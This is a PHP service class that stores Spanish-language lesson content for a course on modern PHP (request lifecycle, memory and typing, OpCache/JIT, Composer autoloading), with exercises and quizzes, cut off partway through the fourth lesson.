<?php

declare(strict_types=1);

namespace App\Service;

class LessonContentService
{
    /**
     * @return array<string, mixed>
     */
    public function getLessonDetails(string $slug): array
    {
        $lessons = $this->getAllLessons();

        return $lessons[$slug] ?? $lessons['php-request-lifecycle'];
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function getAllLessons(): array
    {
        return [
            // ==========================================
            // LECCIÓN 1: PHP Request Lifecycle
            // ==========================================
            'php-request-lifecycle' => [
                'slug' => 'php-request-lifecycle',
                'title' => 'Request Lifecycle & Web Servers',
                'module' => 'PHP Moderno',
                'minutes' => 35,
                'difficulty' => 'Fundamentos',
                'overview' => [
                    'concept' => 'El ciclo de vida de una petición en PHP (Request Lifecycle) describe cada microsegundo desde que un paquete TCP con una petición HTTP llega a la tarjeta de red del servidor hasta que el kernel del Zend Engine libera el último byte de memoria asignado.',
                    'problem' => 'En servidores web de procesos de larga duración (Node.js, Go, Python con Gunicorn), los desarrolladores sufren constantemente por Memory Leaks, fugas de conexiones y corrupción de estado compartido entre usuarios concurrentes.',
                    'solution' => 'PHP implementa una "Share-Nothing Architecture" (Arquitectura de Nada Compartido). Cada petición es un proceso o hilo completamente aislado que no comparte memoria ni variables con ninguna otra petición, garantizando resiliencia absoluta.',
                ],
                'internals' => [
                    'title' => 'Anatomía Interna del Request Lifecycle',
                    'steps' => [
                        [
                            'phase' => '1. Conexión Web Server & FastCGI',
                            'description' => 'Nginx o Apache recibe la petición HTTP. Nginx serializa los headers y el body en tramas binarias del protocolo FastCGI y las envía por un Unix Domain Socket (/run/php/php8.4-fpm.sock) o TCP (127.0.0.1:9000).',
                        ],
                        [
                            'phase' => '2. SAPI Initialization & RINIT',
                            'description' => 'Un proceso worker libre de PHP-FPM despierta. El Server API (SAPI) ejecuta la fase RINIT (Request Initialization). El Zend Engine inicializa las superglobales ($_SERVER, $_GET, $_POST, $_COOKIE) y prepara los pools de memoria de asignación rápida (emalloc).',
                        ],
                        [
                            'phase' => '3. OpCache Hit vs Parsing',
                            'description' => 'El compilador verifica si public/index.php y sus dependencias ya tienen su Abstract Syntax Tree (AST) y Opcodes precompilados en la memoria compartida (Shared Memory SHM). Con OpCache activo, se salta el lexer y parser al 100%, ejecutando Opcodes directamente.',
                        ],
                        [
                            'phase' => '4. Ejecución del Front Controller (Symfony Kernel)',
                            'description' => 'Symfony toma el control: Request::createFromGlobals() envuelve las superglobales en un objeto orientado a objetos inmutable. El HttpKernel despacha eventos (kernel.request, kernel.controller, kernel.response).',
                        ],
                        [
                            'phase' => '5. Output Buffering & Flushing',
                            'description' => 'La Response emite sus headers HTTP (Status Code, Content-Type, Cookies) seguidos del cuerpo HTML o JSON mediante el output buffer hacia Nginx, quien lo transmite al cliente.',
                        ],
                        [
                            'phase' => '6. RSHUTDOWN & Garbage Collection',
                            'description' => 'Fase RSHUTDOWN (Request Shutdown): se ejecutan los destructores (__destruct) y shutdown functions. El Zend Engine destruye todas las variables del heap llamando a efree() masivo. El worker queda limpio para la siguiente petición.',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca asume que la lentitud es culpa de PHP. Antes de optimizar código, inspecciona la comunicación FastCGI y el consumo de memoria por worker. Se pregunta: ¿Cuántos workers PHP-FPM soporta la memoria del servidor antes de hacer swapping a disco? Si cada worker consume 35MB y disponemos de 4GB para PHP, pm.max_children no debe superar 100.',
                    'critical_questions' => [
                        '¿Esta petición realiza operaciones I/O bloqueantes (llamadas a APIs externas, generación de PDF) que retienen el worker PHP-FPM innecesariamente?',
                        '¿OpCache tiene timestamps habilitados en producción (opcache.validate_timestamps=1)? Si es así, PHP está haciendo stat() a disco en cada petición, destruyendo el throughput.',
                        '¿Nuestras conexiones a base de datos son idempotentes y se cierran correctamente al final de la petición o saturan el connection pool de MySQL?',
                        '¿Podríamos delegar esta respuesta completa a una cabecera de caché HTTP (Cache-Control: public, s-maxage=3600) para que Nginx o Cloudflare la respondan en 2ms sin tocar PHP?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar el registro de un nuevo usuario en la plataforma, enviar un correo de bienvenida y registrar analíticas.',
                    'junior' => [
                        'approach' => 'Escribe todo en un solo Controller: valida, inserta en la base de datos con PDO/Doctrine, conecta síncronamente al servidor SMTP de Gmail y envía el email, y luego hace un curl() síncrono a la API de analíticas.',
                        'flaws' => [
                            'La petición tarda entre 2.5 y 4 segundos en responder al usuario.',
                            'Si el servidor SMTP tiene latencia o falla, la petición da timeout 504 y el usuario asume que su registro falló (intentando registrarse 3 veces más).',
                            'Retiene un worker valioso de PHP-FPM ocupado esperando respuesta de red externa (I/O Wait), reduciendo la concurrencia máxima del servidor a menos de 20 usuarios por segundo.',
                            'Cero observabilidad y acoplamiento severo.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Diseña el flujo desacoplado: Valida la entrada mediante un DTO tipado, persiste al usuario en MySQL dentro de una transacción ACID rápida (< 15ms), despacha un evento de dominio UserRegisteredEvent a Symfony Messenger (cola Redis/RabbitMQ) y retorna inmediatamente HTTP 201 Created (< 30ms).',
                        'rationale' => [
                            'El usuario recibe una respuesta instantánea y fluida.',
                            'El envío del email y las analíticas son procesados en segundo plano por workers CLI asíncronos.',
                            'Si el servidor SMTP falla, la cola reintenta automáticamente con backoff exponencial sin afectar al usuario.',
                            'El worker web queda libre en 25ms para atender al siguiente cliente, permitiendo miles de peticiones concurrentes.',
                        ],
                        'trade_offs' => 'Introduce la necesidad de mantener un broker de mensajes (Redis/RabbitMQ) y supervisión de workers con Supervisor/systemd. Para un prototipo de 5 visitas al día puede ser overengineering, pero para un sistema de producción es la única arquitectura viable.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Configuración Segura de FastCGI & Headers',
                    'objective' => 'Implementar una clase PHP 8.4 que verifique el entorno FastCGI y calcule la duración de la petición en microsegundos con tipado estricto.',
                    'instructions' => 'Completa la clase RequestInspector asegurando tipado estricto, protección contra datos nulos y cálculo de duración con microtime(true).',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass RequestInspector\n{\n    /**\n     * @param array<string, string> \$serverParams\n     */\n    public function __construct(private readonly array \$serverParams) {}\n\n    public function isFastCgi(): bool\n    {\n        // TODO: Verifica si el SAPI actual es FastCGI\n        return false;\n    }\n\n    public function getExecutionTimeMicroseconds(float \$requestStartTime): float\n    {\n        // TODO: Retorna la duración exacta de la petición en microsegundos\n        return 0.0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass RequestInspector\n{\n    /**\n     * @param array<string, string> \$serverParams\n     */\n    public function __construct(private readonly array \$serverParams) {}\n\n    public function isFastCgi(): bool\n    {\n        \$gateway = \$this->serverParams['GATEWAY_INTERFACE'] ?? '';\n        \$sapi = \\PHP_SAPI;\n        \n        return str_starts_with(\$gateway, 'CGI/') || in_array(\$sapi, ['fpm-fcgi', 'cgi-fcgi', 'cli-server'], true);\n    }\n\n    public function getExecutionTimeMicroseconds(float \$requestStartTime): float\n    {\n        return (microtime(true) - \$requestStartTime) * 1_000_000;\n    }\n}\n",
                    'explanation' => 'Un código Senior no asume que las claves de $_SERVER siempre existen. Usa operadores de fusión nula (??), constantes nativas tipadas y maneja microtime(true) con precisión de float.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Internals del Request Lifecycle',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es el beneficio primordial del modelo "Share-Nothing" de PHP frente a servidores de aplicación persistentes como Node.js o Go?',
                            'options' => [
                                'a' => 'PHP es automáticamente el doble de rápido en operaciones matemáticas complejas.',
                                'b' => 'Aislamiento total de memoria entre peticiones: un memory leak o error fatal en una petición no contamina la memoria de otros usuarios.',
                                'c' => 'Permite que múltiples servidores web lean el mismo archivo php.ini al mismo tiempo por red.',
                                'd' => 'Evita la necesidad de usar una base de datos relacional como MySQL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'En PHP, cada petición es destruida en la fase RSHUTDOWN. Cualquier variable huérfana o consumo desmedido de memoria es liberado por el Garbage Collector del Zend Engine, evitando memory leaks acumulativos.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué en un entorno de producción Senior se recomienda configurar `opcache.validate_timestamps=0`?',
                            'options' => [
                                'a' => 'Porque así PHP ignora las fechas de los archivos y no hace llamadas stat() al disco en cada petición, reduciendo I/O a cero.',
                                'b' => 'Porque permite editar archivos PHP en vivo por FTP sin reiniciar el servidor.',
                                'c' => 'Para obligar a PHP a usar la zona horaria UTC.',
                                'd' => 'Para cifrar el código fuente contra ingeniería inversa.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Con validate_timestamps=0, el Zend Engine confía ciegamente en los Opcodes en memoria compartida (SHM) y jamás consulta el disco para verificar si el archivo cambió. Los despliegues se actualizan mediante un reload suave de PHP-FPM.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => 'Si un worker de PHP-FPM consume en promedio 40MB de RAM y el servidor tiene 2GB de RAM libre dedicados a PHP, ¿cuál es el cálculo correcto de `pm.max_children`?',
                            'options' => [
                                'a' => 'pm.max_children = 500 para aceptar todo el tráfico posible.',
                                'b' => 'pm.max_children = 10, porque PHP no soporta más.',
                                'c' => 'pm.max_children ≈ 45-50 (2048MB / 40MB ≈ 51 workers), dejando margen para picos.',
                                'd' => 'pm.max_children debe ser igual al número de núcleos de CPU.',
                            ],
                            'correct' => 'c',
                            'explanation' => 'Configurar max_children por encima de la capacidad de RAM física obligará al sistema operativo a usar memoria Swap en disco, lo cual multiplica la latencia por 100 y provoca el colapso del servidor (Out of Memory OOM killer).',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN 2: Tipado Estricto & Gestión de Memoria
            // ==========================================
            'php-types-memory' => [
                'slug' => 'php-types-memory',
                'title' => 'Tipado Estricto & Gestión de Memoria',
                'module' => 'PHP Moderno',
                'minutes' => 45,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'En el núcleo en C de PHP (Zend Engine), cada variable se representa mediante una estructura de 16 bytes llamada zval (Zend Value). Comprender los tipos de datos a este nivel permite escribir código que aprovecha el Copy-on-Write (COW) y evita sobrecargar el Garbage Collector.',
                    'problem' => 'La coerción débil histórica de PHP ("10" + 5 = 15) provocaba bugs sutiles en aplicaciones financieras y de misión crítica. Además, acumular colecciones gigantescas en memoria provocaba errores de agotamiento de memoria (Allowed memory size exhausted).',
                    'solution' => 'El uso estricto de declare(strict_types=1); elimina cualquier coerción implícita, convirtiendo los errores de tipo en TypeErrors inmediatos en tiempo de ejecución. Complementado con Generadores (yield), permite procesar terabytes de datos con apenas 2MB de RAM constante.',
                ],
                'internals' => [
                    'title' => 'Anatomía del zval, Copy-on-Write (COW) y Garbage Collection',
                    'steps' => [
                        [
                            'phase' => '1. La Estructura del zval (16 bytes en x64)',
                            'description' => 'Un zval contiene: value (la unión del valor real o un puntero), u1 (tipo de dato: IS_STRING, IS_ARRAY, IS_OBJECT, IS_LONG), y u2 (información auxiliar y caché). Los enteros y booleanos se almacenan directamente sin asignar memoria adicional.',
                        ],
                        [
                            'phase' => '2. Copy-on-Write (COW)',
                            'description' => 'Cuando asignas $b = $a, PHP NO duplica el array en memoria. Simplemente incrementa el refcount del zend_refcounted. La duplicación física de bytes ocurre ÚNICAMENTE cuando una de las variables intenta mutar el valor.',
                        ],
                        [
                            'phase' => '3. Referencias Circulares y el Buffer GC',
                            'description' => 'Cuando dos objetos se apuntan mutuamente ($a->b = $b; $b->a = $a;) y quedan fuera de scope (unset), su refcount nunca baja a cero. El Garbage Collector de PHP utiliza un algoritmo de coloreo de grafos (Brown, Root Buffer de 10,000 raíces) para detectar y purgar estos ciclos.',
                        ],
                        [
                            'phase' => '4. Generadores (Generators & yield)',
                            'description' => 'Un generador suspende la ejecución de la función y devuelve el control al llamador sin instanciar un array en memoria. La memoria RAM utilizada es O(1), permitiendo iterar 10 millones de filas sin sobrepasar memory_limit.',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Cuando un proceso por lotes (Batch Job / Consumer) arroja "Memory Exhausted", un desarrollador Junior eleva memory_limit = -1 en php.ini. Un Senior reconoce esto como negligencia profesional: elevar el límite solo aplaza el fallo. Un Senior audita las colecciones, reemplaza arrays por Generadores y desasocia explícitamente entidades del Entity Manager de Doctrine.',
                    'critical_questions' => [
                        '¿Estamos cargando un DataSet completo en memoria en lugar de paginar o transmitirlo mediante streaming (Generadores)?',
                        '¿Estamos usando declare(strict_types=1); en el 100% de nuestros archivos PHP para garantizar invariantes de tipado?',
                        '¿Existen closures anónimos que capturan $this innecesariamente, impidiendo que el Garbage Collector libere instancias pesadas de memoria?',
                        '¿Estamos midiendo la memoria con memory_get_usage(true) (memoria real asignada por el SO) o memory_get_usage(false) (memoria rastreada por Zend)?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar un archivo de exportación de transacciones financieras de 2 millones de filas (archivo CSV de 600MB).',
                    'junior' => [
                        'approach' => 'Usa file("export.csv") o fgetcsv() dentro de un bucle para volcar todas las 2 millones de líneas dentro de un array $rows = []. Luego hace un foreach($rows) para calcular totales.',
                        'flaws' => [
                            'El array en PHP consume 3 a 5 veces más memoria que el archivo en disco (600MB en disco se convierten en 2.5GB de zvals en RAM).',
                            'El proceso colapsa con Fatal error: Allowed memory size of 134217728 bytes exhausted.',
                            'El desarrollador eleva memory_limit = 4G en php.ini, provocando que el servidor entre en swap y caiga en producción.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Implementa una función generadora con yield que abre un stream con fopen() y produce un DTO TransactionRow inmutable por cada iteración. Procesa línea a línea y cierra el stream.',
                        'rationale' => [
                            'El consumo de memoria RAM se mantiene estrictamente constante en ~3.5MB durante todo el proceso de los 2 millones de registros.',
                            'El Garbage Collector no sufre presión porque cada zval se destruye en la siguiente vuelta del bucle.',
                            'El sistema puede ejecutarse incluso en contenedores Docker mínimos de 64MB sin fallar jamás.',
                        ],
                        'trade_offs' => 'Los generadores no permiten acceso aleatorio por índice ($data[540]); solo iteración hacia adelante. Si se necesita ordenamiento en memoria, se debe ordenar en la base de datos o en disco antes de procesar.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Lector Eficiente con Generadores en Memoria O(1)',
                    'objective' => 'Construir una clase TransactionStreamer que use Generadores (yield) para procesar datos sin acumular memoria.',
                    'instructions' => 'Implementa un método generateChunks() que produzca paquetes de tamaño fijo sin desbordar el heap, asegurando declare(strict_types=1);.',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Generator;\n\nclass TransactionStreamer\n{\n    /**\n     * @param list<int> \$numbers\n     * @return Generator<int, list<int>>\n     */\n    public function chunkStream(array \$numbers, int \$chunkSize): Generator\n    {\n        // TODO: Emite fragmentos de tamaño \$chunkSize usando yield sin duplicar el array completo\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Generator;\n\nclass TransactionStreamer\n{\n    /**\n     * @param list<int> \$numbers\n     * @return Generator<int, list<int>>\n     */\n    public function chunkStream(array \$numbers, int \$chunkSize): Generator\n    {\n        if (\$chunkSize <= 0) {\n            throw new \\InvalidArgumentException('El tamaño del fragmento debe ser mayor a 0');\n        }\n\n        \$currentChunk = [];\n        foreach (\$numbers as \$num) {\n            \$currentChunk[] = \$num;\n            if (count(\$currentChunk) === \$chunkSize) {\n                yield \$currentChunk;\n                \$currentChunk = [];\n            }\n        }\n\n        if (!empty(\$currentChunk)) {\n            yield \$currentChunk;\n        }\n    }\n}\n",
                    'explanation' => 'El uso de yield suspende el marco de pila (Stack Frame) de la función. La memoria utilizada corresponde únicamente al tamaño del chunk actual ($chunkSize), no a la colección completa.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Memoria, zvals y Tipos en PHP 8.4',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué ocurre en memoria cuando ejecutas `$b = $a;` en PHP si `$a` contiene un array de 50,000 elementos?',
                            'options' => [
                                'a' => 'PHP duplica inmediatamente los 50,000 elementos consumiendo el doble de memoria RAM.',
                                'b' => 'Copy-on-Write (COW): PHP comparte el mismo zval físico e incrementa su contador refcount; la duplicación en RAM ocurrirá sólo si `$a` o `$b` se modifican.',
                                'c' => 'PHP crea un puntero en disco temporal.',
                                'd' => 'Se genera un TypeError porque no se puede clonar un array sin usar clone.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'PHP utiliza Copy-on-Write para evitar duplicación innecesaria. Mientras ninguna variable escriba sobre el array, ambas comparten la misma memoria en el heap.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué `declare(strict_types=1);` debe ubicarse obligatoriamente en la primera línea de cada archivo PHP?',
                            'options' => [
                                'a' => 'Porque activa el motor JIT en ese archivo.',
                                'b' => 'Porque el parser del Zend Engine establece el flag de tipado estricto a nivel de archivo; afecta a las llamadas realizadas desde ese archivo específico.',
                                'c' => 'Para que el navegador web reconozca los tipos de datos en la respuesta JSON.',
                                'd' => 'Es solo una convención estética sin efecto en tiempo de ejecución.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'strict_types es una directiva por archivo. Afecta a los argumentos de funciones invocadas desde ese archivo, impidiendo que PHP intente convertir silenciosamente cadenas numéricas a enteros.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es la solución Senior cuando un script de consola en segundo plano se satura de memoria al procesar miles de registros de base de datos con Doctrine?',
                            'options' => [
                                'a' => 'Establecer memory_limit = -1 en el comando CLI.',
                                'b' => 'Usar `$entityManager->clear()` periódicamente en lotes y procesar mediante cursores/generadores para vaciar el Identity Map de Doctrine.',
                                'c' => 'Reiniciar el servidor MySQL cada 10 minutos.',
                                'd' => 'Desinstalar Doctrine y usar mysql_connect.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El Identity Map de Doctrine retiene en memoria todas las entidades hidratadas para evitar duplicación de instancias. Si procesas 100,000 filas sin llamar a $em->clear(), Doctrine colapsa el heap de PHP.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN 3: OpCache, Preloading & JIT
            // ==========================================
            'php-opcache-jit' => [
                'slug' => 'php-opcache-jit',
                'title' => 'OpCache, Preloading & JIT Compiler',
                'module' => 'PHP Moderno',
                'minutes' => 40,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'PHP es un lenguaje interpretado que compila código fuente a Opcodes (instrucciones para la máquina virtual Zend VM). OpCache almacena estos Opcodes en memoria compartida (SHM) para que peticiones subsiguientes se ejecuten instantáneamente sin volver a leer el disco.',
                    'problem' => 'En servidores sin configurar o con mala configuración de OpCache, cada petición HTTP lee cientos de archivos del disco (Symfony contiene miles de clases), analiza la sintaxis y genera Opcodes desde cero, aumentando el tiempo de respuesta en un 300-500%.',
                    'solution' => 'Configurar OpCache en modo producción con validate_timestamps=0, precargar el framework y las clases core mediante opcache.preload y entender el rol exacto del compilador JIT (Just-In-Time) introducido en PHP 8.',
                ],
                'internals' => [
                    'title' => 'Arquitectura de Memoria Compartida y Preloading',
                    'steps' => [
                        [
                            'phase' => '1. Tokenización y Abstract Syntax Tree (AST)',
                            'description' => 'El lexer divide el archivo .php en tokens (T_VARIABLE, T_FUNCTION), y el parser construye el AST. Este proceso es costoso en CPU y acceso a disco.',
                        ],
                        [
                            'phase' => '2. Opcodes en Shared Memory (SHM)',
                            'description' => 'El compilador de Zend transforma el AST en Opcodes y los ubica en la memoria compartida accesible por todos los workers PHP-FPM. Si OpCache detecta un hit, ejecuta directamente en la Zend VM.',
                        ],
                        [
                            'phase' => '3. Preloading (Precarga en Arranque del Servidor)',
                            'description' => 'Mediante opcache.preload en php.ini, un script PHP se ejecuta una sola vez al arrancar PHP-FPM como root. Todas las clases precargadas (ej. Kernel de Symfony, Services core) quedan vinculadas permanentemente en memoria y disponibles para cualquier petición sin requerir require/autoload.',
                        ],
                        [
                            'phase' => '4. JIT (Just-In-Time Compiler)',
                            'description' => 'El JIT toma los Opcodes más calientes (hot code) y los traduce directamente a código máquina nativo (x86_64 o ARM64), saltándose la interpretación de la Zend VM. Es ideal para tareas CPU-intensivas.',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Muchos desarrolladores novatos creen que activar el JIT mágicamente duplicará la velocidad de su API Symfony. Un Senior sabe que las aplicaciones web modernas son I/O-bound (pasan el 85% de su tiempo esperando a MySQL, Redis o la red). Por tanto, la optimización que genera el mayor impacto es el Preloading y la eliminación de stat() en disco, no el JIT.',
                    'critical_questions' => [
                        '¿Tenemos opcache.memory_consumption configurado con suficiente margen para que el cache no entre en estado "Wasted" (desperdiciado)?',
                        '¿Cómo se gestiona el despliegue continuo (CI/CD) si opcache.validate_timestamps=0? ¿Se ejecuta systemctl reload php-fpm o se usa un symlink atómico?',
                        '¿Por qué las funciones dinámicas o con eval() no se pueden beneficiar de Preloading?',
                        '¿Está el buffer de strings internos (opcache.interned_strings_buffer) configurado en un valor enterprise (ej. 16MB) para evitar cadenas duplicadas en memoria?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Desplegar una actualización de código urgente en un clúster de producción con Symfony en alta demanda.',
                    'junior' => [
                        'approach' => 'Entra por SSH al servidor de producción, ejecuta git pull en la carpeta /var/www/app y asume que el cambio ya está activo.',
                        'flaws' => [
                            'Como OpCache tiene los archivos cacheados en memoria, el servidor sigue sirviendo el código viejo.',
                            'Si opcache.validate_timestamps está en 1, el servidor mezcla Opcodes viejos con nuevos durante el git pull, produciendo fatales "Class not found" a miles de usuarios.',
                            'Cero capacidad de rollback inmediato si la versión nueva tiene un bug crítico.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Usa despliegues basados en symlinks atómicos (ej. Deployer / Capistrano / contenedores inmutables): compila el código en una carpeta nueva (/releases/20260908), precalienta la caché de Symfony, cambia el enlace simbólico /current atómicamente y envía una señal SIGUSR2 para reload suave de PHP-FPM (opcache_reset()).',
                        'rationale' => [
                            'Cero segundos de inactividad (Zero Downtime).',
                            'Ninguna petición procesa código a medias.',
                            'Rollback instantáneo en 100ms volviendo a apuntar el symlink al release anterior.',
                        ],
                        'trade_offs' => 'Requiere espacio en disco para mantener 3-5 versiones históricas y permisos adecuados de reload en el usuario de deploy.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Verificador de Telemetría de OpCache',
                    'objective' => 'Implementar una clase que analice el estado de OpCache y alerte cuando la memoria desperdiciada o el ratio de aciertos (Hit Rate) sea inaceptable.',
                    'instructions' => 'Completa el método calculateHealth() para determinar si OpCache está saludable o requiere atención del equipo de infraestructura.',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass OpCacheHealthChecker\n{\n    /**\n     * @param array<string, mixed> \$opcacheStatus Datos simulados de opcache_get_status()\n     * @return array{healthy: bool, hit_rate: float, alert: ?string}\n     */\n    public function calculateHealth(array \$opcacheStatus): array\n    {\n        // TODO: Extrae hits, misses y determina si el hit rate es superior al 95%\n        return ['healthy' => false, 'hit_rate' => 0.0, 'alert' => 'No implementado'];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nclass OpCacheHealthChecker\n{\n    /**\n     * @param array<string, mixed> \$opcacheStatus\n     * @return array{healthy: bool, hit_rate: float, alert: ?string}\n     */\n    public function calculateHealth(array \$opcacheStatus): array\n    {\n        \$stats = \$opcacheStatus['opcache_statistics'] ?? [];\n        \$hits = (int) (\$stats['hits'] ?? 0);\n        \$misses = (int) (\$stats['misses'] ?? 0);\n        \$total = \$hits + \$misses;\n\n        \$hitRate = \$total > 0 ? (\$hits / \$total) * 100 : 0.0;\n        \$healthy = \$hitRate >= 95.0;\n        \$alert = null;\n\n        if (!\$healthy) {\n            \$alert = sprintf('Hit rate crítico de OpCache: %.2f%% (mínimo recomendado: 95%%)', \$hitRate);\n        }\n\n        return [\n            'healthy' => \$healthy,\n            'hit_rate' => round(\$hitRate, 2),\n            'alert' => \$alert,\n        ];\n    }\n}\n",
                    'explanation' => 'En producción, un Hit Rate de OpCache inferior al 95% indica que la memoria asignada (opcache.memory_consumption) es insuficiente o que el código se invalida continuamente.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: OpCache, Preloading y Compilación JIT',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué sucede si configuras `opcache.validate_timestamps=0` y luego editas un archivo PHP directamente en el servidor?',
                            'options' => [
                                'a' => 'El servidor se bloquea y arroja un error 502 Bad Gateway.',
                                'b' => 'PHP ignorará los cambios y continuará ejecutando los Opcodes en memoria compartida hasta que se reinicie o recargue PHP-FPM.',
                                'c' => 'Los cambios se reflejan inmediatamente en la siguiente petición.',
                                'd' => 'El archivo se borra automáticamente por seguridad.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'validate_timestamps=0 desactiva la comprobación de modificación de disco (mtime). PHP-FPM seguirá sirviendo el código precompilado en memoria hasta recibir la señal de reload.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué el Preloading de PHP (`opcache.preload`) es superior al autoloading tradicional de Composer en producción?',
                            'options' => [
                                'a' => 'Porque precarga las clases en el espacio de memoria permanente del servidor al iniciar PHP-FPM, eliminando el costo de resolución de clases por petición.',
                                'b' => 'Porque comprime las clases en archivos ZIP en memoria.',
                                'c' => 'Porque traduce PHP a JavaScript en el navegador.',
                                'd' => 'Porque desactiva el garbage collector.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Con Preloading, las clases del framework quedan fijadas permanentemente en el arranque. Ninguna petición individual pierde microsegundos buscando o cargando esas clases.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿En cuál de los siguientes escenarios el compilador JIT de PHP 8+ aporta el mayor beneficio de rendimiento?',
                            'options' => [
                                'a' => 'En una API REST que consulta MySQL y devuelve JSON.',
                                'b' => 'En un script de procesamiento de imágenes, redes neuronales o cálculos fractales CPU-bound.',
                                'c' => 'En una plantilla Twig que envía emails por SMTP.',
                                'd' => 'En la conexión SSL/TLS con Redis.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El JIT acelera operaciones computacionales intensivas en CPU donde no hay bloqueo de I/O. En aplicaciones web típicas dominadas por latencia de base de datos o red, el impacto del JIT es marginal.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN 4: PSR, Namespaces & Composer Internals
            // ==========================================
            'php-namespaces-autoloading' => [
                'slug' => 'php-namespaces-autoloading',
                'title' => 'PSR-4, Namespaces & Composer Internals',
                'module' => 'PHP Moderno',
                'minutes' => 30,
                'difficulty' => 'Fundamentos',
                'overview' => [
                    'concept' => 'El estándar PSR-4 describe cómo transformar un Fully Qualified Class Name (FQCN) en una ruta relativa de archivo en disco. Composer implementa este estándar mediante un autoloader optimizado que elimina la necesidad de escribir require o include en cualquier parte del código.',
                    'problem' => 'En aplicaciones legadas, los desarrolladores gestionaban dependencias mediante archivos require_once desordenados, sufriendo por colisiones de nombres de clases (Name Collisions) y penalizaciones de disco brutales.',
                    'solution' => 'El uso de Namespaces de PHP para compartimentar el código y el comando composer dump-autoload -o -a para generar Classmaps autoritativos que convierten las búsquedas de clases en accesos de tabla hash O(1).',
                ],
                'internals' => [
                    'title' => 'Cómo Funciona el ClassLoader de Composer por Dentro',
                    'steps' => [
                        [
                            'phase' => '1. Registro en SPL Autoload Stack',
                            'description' => 'vendor/autoload.php invoca spl_autoload_register(). Registra la función de resolución de Composer en la pila de autoloaders del Zend Engine.',
                        ],
                        [
                            'phase' => '2. Interceptación de la Clase',
                            'description' => 'Cuando el código hace new App\Service\PaymentProcessor(), el Zend Engine comprueba que la clase no existe y dispara la pila SPL pasando el string App\Service\PaymentProcessor.',
                        ],
                        [
                            'phase' => '3. Authoritative Classmap vs Búsqueda PSR-4 en Disco',
                            'description' => 'En modo normal, Composer traduce el prefijo de namespace (App\ => src/) y realiza stat() en disco para comprobar si PaymentProcessor.php existe. En modo optimizado (-a), busca directamente en un array asociativo en memoria sin tocar el disco.',
                        ],
                        [
                            'phase' => '4. Declaración de la Clase en la Tabla de Símbolos',
                            'description' => 'El autoloader ejecuta require del archivo. La clase queda registrada en la tabla de símbolos interna de PHP para el resto del ciclo de vida de la petición.',
                        ],
                    ],
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior audita constantemente el archivo composer.lock. Sabe que composer.json es solo una lista de intenciones, mientras que composer.lock es el manifiesto criptográfico de lo que realmente corre en producción. Nunca permite que en CI/CD se ejecute composer update, solo composer install --no-dev --optimize-autoloader.',
                    'critical_questions' => [
                        '¿Estamos ejecutando composer dump-autoload con flags de producción (-o -a) en nuestros pipelines de Docker?',
                        '¿Por qué nunca se debe comitear la carpeta vendor/ a Git pero es obligatorio comitear composer.lock?',
                        '¿Estamos corriendo composer audit regularmente en nuestros pipelines de CI/CD para detectar CVEs en dependencias de terceros?',
                        '¿Cumplen nuestras clases con los estándares de estilo PER-CS / PSR-12 verificados automáticamente con PHP-CS-Fixer?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Instalar una librería de generación de PDFs y desplegarla en el entorno de producción.',
                    'junior' => [
                        'approach' => 'Ejecuta composer require vendor/pdf-lib:dev-master, comitea solo el composer.json y en el servidor de producción ejecuta composer update.',
                        'flaws' => [
                            'Al usar dev-master, cualquier cambio imprevisto en el repositorio del autor puede romper la aplicación en el siguiente deploy.',
